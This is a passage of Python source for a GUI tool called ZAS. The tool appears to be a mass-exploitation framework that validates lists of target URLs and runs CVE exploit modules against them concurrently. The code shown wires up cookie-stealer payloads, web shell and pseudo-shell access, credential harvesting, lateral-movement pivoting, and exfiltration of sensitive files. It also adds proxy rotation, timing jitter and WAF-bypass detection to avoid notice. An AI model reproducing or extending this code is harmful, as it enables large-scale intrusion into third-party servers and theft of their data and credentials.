            target=self._scan_worker, args=(list(self.targets), selected), daemon=True,
        )
        self.scan_thread.start()

    def _toggle_pause(self):
        if not self.scanning:
            return
        if self.paused:
            self.paused = False
            self.pause_event.set()
            self.pause_btn.configure(text=" PAUSE ")
            self.log("[*] Resumed", "info")
            self.status_var.set("Scanning...")
        else:
            self.paused = True
            self.pause_event.clear()
            self.pause_btn.configure(text=" RESUME ")
            self.log("[*] Paused", "pause")
            self.status_var.set("Paused")

    def _stop_scan(self):
        self.scanning = False
        self.paused = False
        self.pause_event.set()
        audit_log.info("scan_stopped_by_user")
        self.log("[!] Stopped", "warn")
        self.status_var.set("Stopping...")
        self.start_btn.configure(state="normal")
        self.pause_btn.configure(state="disabled", text=" PAUSE ")
        self.stop_btn.configure(state="disabled")

    def _scan_finished(self):
        self.scanning = False
        self.paused = False
        self.scan_completed = True
        self.progress["value"] = 100
        self.start_btn.configure(state="normal")
        self.pause_btn.configure(state="disabled", text=" PAUSE ")
        self.stop_btn.configure(state="disabled")
        self._auto_save_results()
        with self.results_lock:
            count = len(self.results_data)
        self.status_var.set(f"Done | {count} finding(s)")
        audit_log.close()

    def _scan_worker(self, targets, selected_modules):
        mode = self.mode_var.get()
        try:
            timeout = max(1, int(self.timeout_var.get() or 15))
            threads = max(1, min(100, int(self.threads_var.get() or 10)))
            delay = max(0, float(self.delay_var.get() or 0))
            jitter_str = self.jitter_var.get().strip()
            if "-" in jitter_str:
                jmin, jmax = jitter_str.split("-", 1)
                jitter_min, jitter_max = float(jmin), float(jmax)
            else:
                jitter_min, jitter_max = 0.3, 2.0
        except ValueError:
            self.log("[!] Invalid numeric settings", "error")
            self.root.after(0, self._scan_finished)
            return

        from zas_core import set_jitter
        set_jitter(jitter_min, jitter_max)

        audit_log.scan_start(
            mode=mode,
            targets=len(targets),
            modules=len(selected_modules),
            threads=threads,
            ignore_ssl=getattr(self, "ignore_ssl_var", None).get() if hasattr(self, "ignore_ssl_var") else True,
        )

        extra_args = {}
        if self.username_var.get():
            extra_args["username"] = self.username_var.get()
        if self.password_var.get():
            extra_args["password"] = self.password_var.get()
        if self.cmd_var.get():
            extra_args["cmd"] = self.cmd_var.get()
        if self.payload_url_var.get():
            extra_args["payload_url"] = self.payload_url_var.get()
        if self.shell_token_var.get():
            extra_args["shell_token"] = self.shell_token_var.get()
        if self.payload_file_var.get():
            pf = self.payload_file_var.get()
            if os.path.exists(pf):
                extra_args["payload_file"] = pf
                self.log(f"[*] Using custom payload: {pf}", "info")
            else:
                self.log(f"[!] Payload file not found: {pf}", "warn")
        if self.cookie_steal_var.get():
            extra_args["payload_type"] = "cookie_stealer"
        if self.exfiltration_var.get():
            extra_args["exfiltration"] = True
        from zas_core import proxy_count
        if proxy_count() > 0:
            self.log(f"[*] Proxy chain: {proxy_count()} proxies loaded, rotating per-request", "info")

        active = {k: v for k, v in self.exploits.items() if k in selected_modules}

        seen = set()
        unique_targets = []
        for raw in targets:
            url = normalize_url(raw)
            if url and url not in seen:
                seen.add(url)
                unique_targets.append(url)

        if len(unique_targets) < len(targets):
            self.log(f"[*] Deduplicated: {len(targets)} -> {len(unique_targets)} unique", "info")

        skip_validation = self.skip_validation_var.get()

        if skip_validation:
            valid_targets = unique_targets
            self.log(f"[*] Validation skipped, using {len(valid_targets)} targets", "info")
        else:
            valid_targets = []
            skip_count = [0]
            val_lock = threading.Lock()
            val_done = [0]

            def validate_one(url):
                try:
                    req = urllib.request.Request(url, method="HEAD", headers={"User-Agent": "Mozilla/5.0"})
                    urllib.request.urlopen(req, timeout=5)
                    with val_lock:
                        valid_targets.append(url)
                    return
                except (OSError, urllib.error.URLError, TimeoutError, ValueError):
                    pass
                try:
                    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                    urllib.request.urlopen(req, timeout=5)
                    with val_lock:
                        valid_targets.append(url)
                    return
                except (OSError, urllib.error.URLError, TimeoutError, ValueError):
                    pass
                with val_lock:
                    skip_count[0] += 1

            self.log(f"[*] Validating {len(unique_targets)} targets...", "info")
            self.root.after(0, lambda: self.status_var.set(f"Validating: 0/{len(unique_targets)}"))

            val_q = queue.Queue()
            for u in unique_targets:
                val_q.put(u)

            def val_worker():
                while self.scanning:
                    try:
                        url = val_q.get_nowait()
                    except queue.Empty:
                        return
                    short = url.replace("https://", "").replace("http://", "")[:45]
                    self.root.after(0, lambda s=short: self.status_var.set(f"Check: {s}"))
                    validate_one(url)
                    with val_lock:
                        val_done[0] += 1
                    d = val_done[0]
                    self.root.after(0, lambda v=d, t=len(unique_targets): self.status_var.set(f"Validating: {v}/{t}"))
                    val_q.task_done()

            val_threads = []
            for _ in range(min(20, len(unique_targets))):
                t = threading.Thread(target=val_worker, daemon=True)
                t.start()
                val_threads.append(t)
            for t in val_threads:
                t.join(timeout=120)

            if not self.scanning:
                return

            if not valid_targets:
                self.log(f"[!] No reachable targets ({skip_count[0]} unreachable)", "error")
                self.root.after(0, self._scan_finished)
                return

            self.log(f"[*] {len(valid_targets)} reachable / {skip_count[0]} unreachable", "info")

        q = queue.Queue()
        for t in valid_targets:
            q.put(t)

        stats = {"done": 0, "vuln": 0, "exploited": 0, "errors": 0}
        total = len(valid_targets)
        lock = threading.Lock()
        # Scan-level flag (mutable cell) — do not assign HAS_ADVANCED inside worker()
        advanced_available = [HAS_ADVANCED]

        def worker():
            while self.scanning:
                self.pause_event.wait()
                if not self.scanning:
                    break
                try:
                    raw = q.get_nowait()
                except queue.Empty:
                    return

                url = raw
                short = url.replace("https://", "").replace("http://", "")[:40]
                self.root.after(0, lambda s=short: self.status_var.set(f"Scanning: {s}"))

                # Advanced: Passive fingerprinting + WAF detection (once per target)
                if advanced_available[0] and getattr(self, 'fingerprint_var', None) and self.fingerprint_var.get():
                    try:
                        try:
                            import requests as req_lib
                        except ImportError:
                            self.log("[!] 'requests' library not installed. Run: pip install requests", "error")
                            advanced_available[0] = False
                        else:
                            resp = req_lib.get(url, timeout=timeout, verify=_get_ssl_verify(), headers={"User-Agent": "Mozilla/5.0"})
                            fp = self._run_fingerprint(url, resp.text, resp.headers, resp.cookies)
                            if fp and fp.get("cms") != "unknown":
                                self.log(f"[FP] {url} -> {fp['cms']} v{fp.get('version', '?')} (confidence: {fp.get('confidence', 0)}%)", "info")
                                if fp.get("technologies"):
                                    self.log(f"[FP] Technologies: {', '.join(fp['technologies'])}", "info")
                            waf = self._run_waf_detection(url, resp.text, resp.headers, resp.cookies, resp.status_code)
                            if waf and waf.get("waf"):
                                self.log(f"[WAF] {url} -> {waf['waf']} (confidence: {waf.get('confidence', 0)}%)", "warn")
                                if waf.get("bypasses"):
                                    self.log(f"[WAF] Bypasses: {', '.join(waf['bypasses'][:3])}", "info")
                    except Exception:
                        pass

                for name, exp in active.items():
                    if not self.scanning:
                        break
                    self.pause_event.wait()

                    cve = exp["cve"]
                    mod = exp["module"]
                    
                    if mod is None:
                        continue

                    try:
                        if mode == "exploit":
                            result = mod.exploit(url, timeout=timeout, **extra_args)
                            if result.get("ok"):
                                self.log(f"[OK] {cve} @ {url}", "success")
                                for k, v in result.items():
                                    if k not in ("cookies", "rce_func", "cookies_editthiscookie") and v:
                                        self.log(f"     {k}: {v}", "success")

                                # Send notification
                                self._send_notification(cve, url, "exploited", result)
                                audit_log.finding(
                                    cve, url, "exploited",
                                    shell_url=result.get("shell_url"),
                                    token=result.get("token"),
                                    output=(result.get("output") or "")[:200],
                                )

                                # Add shell tab (real or pseudo)
                                shell_url = result.get("shell_url")
                                if shell_url:
                                    # Real shell - has persistent URL
                                    self._add_shell_button(shell_url, result.get("token"), cve, url, mod=mod)
                                else:
                                    # Pseudo-shell - re-exploit each command
                                    self._add_shell_button(url, result.get("token"), cve, url, mod=mod, pseudo=True)

                                with lock:
                                    stats["exploited"] += 1
                                    with self.results_lock:
                                        self.results_data.append({"cve": cve, "url": url, "status": "exploited", "details": result})

                                # Advanced: Credential harvesting
                                if HAS_ADVANCED and getattr(self, 'cred_harvest_var', None) and self.cred_harvest_var.get():
                                    creds = self._run_credential_harvest(url, timeout, extra_args.get("proxies"))
                                    if creds:
                                        with self.results_lock:
                                            self.results_data.append({"cve": "CREDS-001", "url": url, "status": "credentials", "details": {"count": len(creds), "creds": creds}})

                                # Advanced: Pivot / Lateral movement
                                if HAS_ADVANCED and getattr(self, 'pivot_var', None) and self.pivot_var.get():
                                    pivot_targets = self._run_pivot(url, timeout, extra_args.get("proxies"))
                                    if pivot_targets:
                                        with self.results_lock:
                                            self.results_data.append({"cve": "PIVOT-001", "url": url, "status": "pivot", "details": {"targets": len(pivot_targets), "pivot_targets": pivot_targets}})

                                post_args = {
                                    "shell_url": result.get("shell_url"),
                                    "shell_token": result.get("token"),
                                    "rce_func": result.get("rce_func"),
                                }
                                if any(post_args.values()):
                                    if extra_args.get("exfiltration"):
                                        try:
                                            import post_exfiltration as exf_mod
                                            self.log(f"  [EXFIL] Running exfiltration on {url}...", "info")
                                            exf_result = exf_mod.exploit(url, timeout=timeout, **post_args)
                                            if exf_result.get("ok"):
                                                files_count = len(exf_result.get("sensitive_files", {}))
                                                self.log(f"  [EXFIL] Found {files_count} sensitive files", "success")
                                                with self.results_lock:
                                                    self.results_data.append({"cve": "EXFIL-001", "url": url, "status": "exfiltration", "details": exf_result})
                                        except Exception as e:
                                            self.log(f"  [EXFIL] Error: {e}", "error")
                            else:
                                reason = result.get("reason", "unknown")
                                self.log(f"[FAIL] {cve} @ {url} - {reason}", "info")

                    except Exception as e:
                        self.log(f"[ERR] {cve} @ {url} - {e}", "error")
                        audit_log.error(cve, url, e)
                        with lock:
                            stats["errors"] += 1

                    if delay > 0:
                        time.sleep(delay)

                with lock:
                    stats["done"] += 1
                d = stats["done"]
                pct = int(d / total * 100) if total > 0 else 0
                self.root.after(0, lambda v=d, p=pct, t=total: (
                    self.status_var.set(f"{v}/{t} ({p}%) | V:{stats['vuln']} E:{stats['exploited']} Err:{stats['errors']}"),
                    self.progress.configure(value=p),
                ))
                q.task_done()

        num = min(threads, len(valid_targets))
        workers = [threading.Thread(target=worker, daemon=True) for _ in range(num)]
        for w in workers:
            w.start()

        # Graceful cancel: wait for workers; honor STOP without hanging forever
        # Workers exit between items when self.scanning becomes False.
        deadline = time.monotonic() + 3600  # absolute safety cap
        while time.monotonic() < deadline:
            alive = [w for w in workers if w.is_alive()]
            if not alive:
                break
            # Stop requested → give workers a short window to exit cleanly
            if not self.scanning:
                for w in alive:
                    w.join(timeout=2.0)
                alive = [w for w in workers if w.is_alive()]
                if alive:
                    self.log(f"[!] {len(alive)} worker(s) still running (in-flight request); abandoning wait", "warn")
                break
            # Normal progress wait
            for w in alive:
                w.join(timeout=0.5)
        else:
            self.log("[!] Scan wait deadline exceeded", "error")
            self.scanning = False
            self.pause_event.set()

        still_alive = sum(1 for w in workers if w.is_alive())
        status = "stopped" if not self.scanning else "done"

        self.log("", "info")
        self.log("=" * 50, "header")
        self.log(f"  Done | V:{stats['vuln']} E:{stats['exploited']} Err:{stats['errors']}", "header")
        self.log("=" * 50, "header")

        with self.results_lock:
            findings = len(self.results_data)
        audit_log.scan_end(
            status=status,
            vuln=stats["vuln"],
            exploited=stats["exploited"],
            errors=stats["errors"],
            findings=findings,
        )

        self.root.after(0, self._scan_finished)


def main():
    root = tk.Tk()
    try:
        root.iconbitmap(default="")
    except Exception:
        pass
    
    # Show splash screen while loading
    def load_modules(update_progress):
        """Load modules with progress updates."""
        update_progress("Initializing ZAS...", 15)
        time.sleep(0.4)
        
        update_progress("Loading local modules...", 50)
        time.sleep(0.4)
        
        update_progress("Preparing GUI...", 75)
        time.sleep(0.4)
        
        update_progress("Ready!", 100)
        time.sleep(0.8)
    
    def show_main():
        ZASApp(root)
        root.mainloop()
    
    try:
        from splash import SplashScreen
        splash = SplashScreen(on_complete=show_main)
        splash.start(load_modules)
    except Exception:
        # Fallback: no splash, just show main GUI
        ZASApp(root)
        root.mainloop()


if __name__ == "__main__":
    main()
